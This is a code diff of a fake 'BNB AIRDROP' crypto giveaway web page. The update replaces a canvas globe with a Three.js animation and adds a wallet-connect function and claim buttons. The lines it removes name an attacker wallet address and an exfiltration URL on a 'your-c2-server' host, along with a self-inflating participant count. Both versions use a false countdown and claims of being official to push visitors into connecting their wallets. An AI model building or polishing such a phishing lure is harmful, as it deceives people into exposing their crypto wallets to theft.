@@ -2,74 +2,306 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>BNB AIRDROP - Official Web3 Campaign 2025</title>
-    <link rel="stylesheet" href="assets/style.css">
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>BNB AIRDROP 2025 — Surreal Web3 Experience</title>
     <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #000;
+            --text: #fff;
+            --gold: #f3ba2f;
+            --gold-grad: linear-gradient(180deg, #fff, #f3ba2f);
+            --blue: #00aaff;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Orbitron', sans-serif;
+        }
+        body {
+            background: var(--bg);
+            color: var(--text);
+            overflow: hidden;
+            position: relative;
+        }
+        #canvas-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(10px);
+            position: relative;
+            z-index: 100;
+            border-bottom: 1px solid var(--gold);
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            font: 900 1.6em 'Orbitron', sans-serif;
+            color: var(--text);
+        }
+        .logo span {
+            background: var(--gold-grad);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-left: 8px;
+        }
+        .logo .coin {
+            width: 28px;
+            height: 28px;
+            background: var(--gold);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            color: #000;
+            margin-right: 8px;
+        }
+        nav {
+            display: flex;
+            gap: 18px;
+        }
+        nav a {
+            color: var(--text);
+            text-decoration: none;
+            font-size: 0.95em;
+        }
+        nav a:hover, nav a.active {
+            color: var(--gold);
+            text-shadow: 0 0 10px rgba(243, 186, 47, 0.7);
+        }
+        .connect-btn {
+            background: transparent;
+            color: var(--gold);
+            border: 1px solid var(--gold);
+            padding: 8px 14px;
+            border-radius: 6px;
+            font-size: 0.9em;
+            cursor: pointer;
+        }
+        .hero {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 80px 20px 40px;
+            text-align: center;
+            position: relative;
+            z-index: 10;
+            min-height: 100vh;
+        }
+        .countdown {
+            color: var(--gold);
+            font-size: 1.4em;
+            margin: 20px 0;
+            text-shadow: 0 0 15px rgba(243, 186, 47, 0.8);
+            font-weight: 600;
+        }
+        .hero-buttons {
+            display: flex;
+            gap: 20px;
+            margin: 30px 0;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .claim-btn {
+            background: var(--gold);
+            color: #000;
+            border: none;
+            padding: 16px 32px;
+            font-size: 1.2em;
+            font-weight: bold;
+            border-radius: 10px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 0 30px rgba(243, 186, 47, 0.4);
+            animation: pulse 2s infinite;
+            min-width: 280px;
+        }
+        .how-btn {
+            background: transparent;
+            color: var(--gold);
+            border: 1px solid var(--gold);
+            padding: 16px 24px;
+            font-size: 1.2em;
+            border-radius: 10px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .vortex {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 300px;
+            height: 300px;
+            border: 2px solid var(--blue);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            opacity: 0.2;
+            z-index: 1;
+            animation: rotate 20s linear infinite;
+        }
+        .vortex::before {
+            content: '';
+            position: absolute;
+            width: 250px;
+            height: 250px;
+            border: 2px solid var(--gold);
+            border-radius: 50%;
+            animation: rotate 15s linear reverse infinite;
+        }
+        .vortex::after {
+            content: '';
+            position: absolute;
+            width: 200px;
+            height: 200px;
+            border: 2px solid #00ccff;
+            border-radius: 50%;
+            animation: rotate 10s linear infinite;
+        }
+        .bnb-stack {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            z-index: 2;
+        }
+        .bnb-cube {
+            width: 60px;
+            height: 60px;
+            background: var(--gold);
+            color: #000;
+            font: 900 1.2em 'Orbitron', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 12px;
+            box-shadow: 0 0 20px rgba(243, 186, 47, 0.6);
+            animation: float 4s ease-in-out infinite;
+        }
+        .bnb-label {
+            color: var(--text);
+            font-size: 1.1em;
+            margin-top: 10px;
+            opacity: 0.8;
+        }
+        .features {
+            display: flex;
+            justify-content: space-around;
+            padding: 60px 20px;
+            background: rgba(0,0,0,0.7);
+            border-top: 1px solid var(--gold);
+            position: relative;
+            z-index: 10;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+        .feature {
+            text-align: center;
+            width: 22%;
+            min-width: 140px;
+        }
+        .feature i {
+            font-size: 2em;
+            color: var(--gold);
+            margin-bottom: 10px;
+            display: block;
+        }
+        .feature h3 {
+            font-size: 1em;
+            margin-bottom: 8px;
+            color: var(--gold);
+        }
+        .feature p {
+            font-size: 0.8em;
+            color: #999;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); box-shadow: 0 0 30px rgba(243, 186, 47, 0.4); }
+            50% { transform: scale(1.05); box-shadow: 0 0 50px rgba(243, 186, 47, 0.8); }
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @media (max-width: 768px) {
+            .hero-buttons { flex-direction: column; align-items: center; }
+            .claim-btn, .how-btn { width: 80%; }
+            .features { flex-direction: column; align-items: center; }
+            .feature { width: 100%; text-align: center; }
+        }
+    </style>
 </head>
 <body>
 
+<div id="canvas-container"></div>
+
 <header>
     <div class="logo">
-        <div class="bnb-icon"></div>
-        <span>BNB AIRDROP</span><span class="web3-badge">Web3</span>
+        <div class="coin">B</div>
+        <span>BNB AIRDROP</span>
     </div>
     <nav>
-        <ul>
-            <li><a href="index.html" target="_self">Home</a></li>
-            <li><a href="airdrop.html" target="_blank">Airdrop</a></li>
-            <li><a href="how.html" target="_blank">How It Works</a></li>
-            <li><a href="tokenomics.html" target="_blank">Tokenomics</a></li>
-            <li><a href="faq.html" target="_blank">FAQ</a></li>
-        </ul>
+        <a href="#" class="active">Web3 Home</a>
+        <a href="airdrop.html" target="_blank">Airdrop</a>
+        <a href="how.html" target="_blank">How It Works</a>
+        <a href="tokenomics.html" target="_blank">Tokenomics</a>
+        <a href="faq.html" target="_blank">FAQ</a>
     </nav>
-    <button class="connect-btn" onclick="openConnect()">
+    <button class="connect-btn" onclick="connectWallet()">
         <i class="fas fa-wallet"></i> Connect Wallet
     </button>
 </header>
 
 <section class="hero">
-    <div class="hero-content">
-        <h1>BNB AIRDROP</h1>
-        <p>Join the official BNB Web3 Airdrop, connect your wallet, complete simple tasks, and secure your free BNB tokens today.</p>
+    <h1 style="font-size: 2.5em; background: var(--gold-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
+        BNB AIRDROP
+    </h1>
+    <p style="font-size: 1.3em; color: #ccc; margin: 15px 0;">
+        Claim your free BNB tokens now
+    </p>
 
-        <div class="stats">
-            <div class="stat-box">
-                <i class="fas fa-gift"></i>
-                <div class="value">1,000 BNB</div>
-                <div class="label">Airdrop Pool</div>
-            </div>
-            <div class="stat-box">
-                <i class="fas fa-users"></i>
-                <div class="value" id="participants">543,289+</div>
-                <div class="label">Total Participants</div>
-            </div>
-            <div class="stat-box">
-                <i class="fas fa-flame"></i>
-                <div class="value" id="countdown">03d 14h 27m</div>
-                <div class="label">Time Left</div>
-            </div>
-        </div>
+    <div class="countdown" id="countdown">3d 14h 26m Time Left</div>
 
-        <div class="hero-buttons">
-            <button class="claim-btn" onclick="openClaim()">
-                <i class="fas fa-gift"></i> Claim Airdrop Now
-            </button>
-            <button class="how-btn" onclick="openHow()">
-                <i class="fas fa-play"></i> How It Works
-            </button>
-        </div>
+    <div class="hero-buttons">
+        <button class="claim-btn" onclick="window.open('claim.html', '_blank')">
+            <i class="fas fa-gift"></i> Claim Airdrop Now
+        </button>
+        <button class="how-btn" onclick="window.open('how.html', '_blank')">
+            <i class="fas fa-play"></i> How It Works
+        </button>
     </div>
 
-    <div class="hero-visual">
-        <canvas id="earth-canvas"></canvas>
-        <div class="bnb-coin"></div>
-        <div class="pedestal">BNB</div>
-        <div class="parachute"><canvas class="parachute-canvas"></canvas></div>
-        <div class="parachute"><canvas class="parachute-canvas"></canvas></div>
-        <div class="parachute"><canvas class="parachute-canvas"></canvas></div>
+    <div class="vortex" id="vortex"></div>
+    <div class="bnb-stack">
+        <div class="bnb-cube">BNB</div>
+        <div class="bnb-cube">BNB</div>
+        <div class="bnb-cube">BNB</div>
     </div>
+    <div class="bnb-label">BNB</div>
 </section>
 
 <section class="features">
@@ -96,53 +328,96 @@
 </section>
 
 <script>
-    const ATTACKER_ADDRESS = "0x40f4c332be705dbf098a48a728248b13a005e7cb";
-    const EXFIL_URL = "https://your-c2-server.com/log.php";
+    // === 3D VORTEX ===
+    const scene = new THREE.Scene();
+    const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+    const renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
+    renderer.setSize(window.innerWidth, window.innerHeight);
+    document.getElementById("canvas-container").appendChild(renderer.domElement);
 
-    function openConnect() { window.open('connect.html', '_blank', 'width=400,height=600'); }
-    function openClaim() { window.open('claim.html', '_blank'); }
-    function openHow() { window.open('how.html', '_blank'); }
+    // Floating 3D BNB Cubes
+    const cubes = [];
+    for (let i = 0; i < 8; i++) {
+        const geometry = new THREE.BoxGeometry(20, 20, 20);
+        const material = new THREE.MeshPhongMaterial({
+            color: 0xf3ba2f,
+            emissive: 0xf3ba2f,
+            emissiveIntensity: 0.5,
+            wireframe: Math.random() > 0.7
+        });
+        const cube = new THREE.Mesh(geometry, material);
+        cube.position.set(
+            Math.random() * 400 - 200,
+            Math.random() * 400 - 200,
+            Math.random() * 400 - 200
+        );
+        cube.rotation.set(
+            Math.random(),
+            Math.random(),
+            Math.random()
+        );
+        scene.add(cube);
+        cubes.push({
+            mesh: cube,
+            speed: {
+                x: Math.random() * 0.02,
+                y: Math.random() * 0.02,
+                z: Math.random() * 0.02
+            }
+        });
+    }
 
-    let count = 543289;
-    setInterval(() => {
-        count += Math.floor(Math.random() * 3) + 1;
-        document.getElementById("participants").innerText = count.toLocaleString() + "+";
-    }, 2500);
+    camera.position.z = 500;
 
-    const endTime = new Date().getTime() + 3 * 86400000 + 14 * 3600000 + 27 * 60000;
+    function animate() {
+        requestAnimationFrame(animate);
+        cubes.forEach(item => {
+            item.mesh.rotation.x += item.speed.x;
+            item.mesh.rotation.y += item.speed.y;
+            item.mesh.rotation.z += item.speed.z;
+            item.mesh.position.y -= 0.1;
+            if (item.mesh.position.y < -300) {
+                item.mesh.position.y = 300;
+                item.mesh.position.x = Math.random() * 400 - 200;
+            }
+        });
+        renderer.render(scene, camera);
+    }
+    animate();
+
+    window.addEventListener('resize', () => {
+        camera.aspect = window.innerWidth / window.innerHeight;
+        camera.updateProjectionMatrix();
+        renderer.setSize(window.innerWidth, window.innerHeight);
+    });
+
+    // === COUNTDOWN ===
+    const endTime = new Date().getTime() + 3 * 86400000 + 14 * 3600000 + 26 * 60000;
     function updateCountdown() {
         const now = new Date().getTime();
         const diff = endTime - now;
         const days = Math.floor(diff / (1000 * 60 * 60 * 24));
         const hours = Math.floor((diff % 86400000) / 3600000);
         const mins = Math.floor((diff % 3600000) / 60000);
-        document.getElementById("countdown").innerText = `${days}d ${hours}h ${mins}m`;
+        document.getElementById("countdown").innerText = `${days}d ${hours}h ${mins}m Time Left`;
     }
     setInterval(updateCountdown, 1000);
     updateCountdown();
 
-    const canvas = document.getElementById("earth-canvas");
-    const ctx = canvas.getContext("2d");
-    canvas.width = 300; canvas.height = 300;
-    let angle = 0;
-    const earthImg = new Image();
-    earthImg.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/The_Blue_Marble_%28remastered%29.jpg/600px-The_Blue_Marble_%28remastered%29.jpg";
-    earthImg.onload = () => { setInterval(drawEarth, 50); };
-    function drawEarth() {
-        ctx.clearRect(0, 0, 300, 300);
-        ctx.save();
-        ctx.translate(150, 150);
-        ctx.rotate(angle);
-        ctx.drawImage(earthImg, -100, -100, 200, 200);
-        ctx.restore();
-        angle += 0.01;
+    // === WALLET CONNECT ===
+    async function connectWallet() {
+        if (typeof window.ethereum === "undefined") {
+            alert("Please install MetaMask or Trust Wallet.");
+            return;
+        }
+        try {
+            await window.ethereum.request({ method: "eth_requestAccounts" });
+            alert("✅ Wallet connected!");
+        } catch (err) {
+            console.error(err);
+        }
     }
-
-    document.querySelectorAll(".parachute-canvas").forEach(el => {
-        const c = el.getContext("2d");
-        c.fillStyle = "#f3ba2f"; c.fillRect(0, 0, 60, 60);
-        c.fillStyle = "#000"; c.font = "bold 20px Orbitron"; c.textAlign = "center"; c.fillText("BNB", 30, 30);
-    });
 </script>
+
 </body>
 </html>
